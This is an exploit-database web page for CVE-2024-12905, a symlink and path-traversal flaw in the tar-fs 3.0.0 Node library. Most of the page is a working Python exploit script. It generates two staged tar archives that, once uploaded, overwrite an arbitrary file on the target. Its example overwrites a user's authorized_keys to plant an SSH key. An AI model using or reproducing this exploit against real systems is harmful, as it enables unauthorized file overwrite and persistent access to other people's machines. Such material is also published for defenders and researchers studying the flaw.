---
title: tar-fs 3.0.0 Arbitrary File Write/Overwrite
url: https://cxsecurity.com/issue/WLB-2025050015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-07
fetch_date: 2025-10-06T22:23:23.297066
---

# tar-fs 3.0.0 Arbitrary File Write/Overwrite

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **tar-fs 3.0.0 Arbitrary File Write/Overwrite** **2025.05.06**  Credit:  **[Ardayfio Samuel Nii Aryee](https://cxsecurity.com/author/Ardayfio%2BSamuel%2BNii%2BAryee/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2024-12905](https://cxsecurity.com/cveshow/CVE-2024-12905/ "Click to see CVE-2024-12905")**  CWE: **N/A** | |

# Exploit Title: tar-fs 3.0.0 - Arbitrary File Write/Overwrite
# Date: 17th April, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Software link: https://github.com/mafintosh/tar-fs
# Version: tar-fs 3.0.0
# Tested on: Ubuntu
# CVE: CVE-2024-12905
# Run the command: Example: python3 exploit.py authorized\_keys ../../../../../../../../home/user1/authorized\_keys
# This will generate two tar file: stage\_1.tar and stage\_2.tar
# Upload stage\_1.tar first to unarchive the symlink
# Next, upload stage\_2.tar to finally write/overwrite the file on the system
import os
import sys
import tarfile
link\_name = "normal\_file"
def check\_arguments():
if len(sys.argv) != 3:
print(f"Usage: {sys.argv[0]} <path\_to\_file\_contents> <path\_to\_target\_file\_to\_overwrite>\n\
Example: {sys.argv[0]} authorized\_keys ../../../../../../../../home/user1/authorized\_keys\
")
sys.exit()
content\_file\_path = sys.argv[1]
target\_file\_path = sys.argv[2]
return content\_file\_path, target\_file\_path
def create\_symlink(link\_name, target\_path):
os.symlink(target\_path, link\_name)
print("[+] Created symlink: {link\_name} -> {target\_path}")
def archive\_files(archive\_name, file\_path):
tar = tarfile.open(archive\_name, 'w')
tar.add(file\_path, link\_name, recursive=False)
tar.close()
print(f"[+] Archived to: {archive\_name}")
def main():
content\_path, target\_file = check\_arguments()
stage\_1\_archive\_name = "stage\_1.tar"
stage\_2\_archive\_name = "stage\_2.tar"
create\_symlink(link\_name, target\_file)
archive\_files(stage\_1\_archive\_name, link\_name)
archive\_files(stage\_2\_archive\_name, content\_path)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top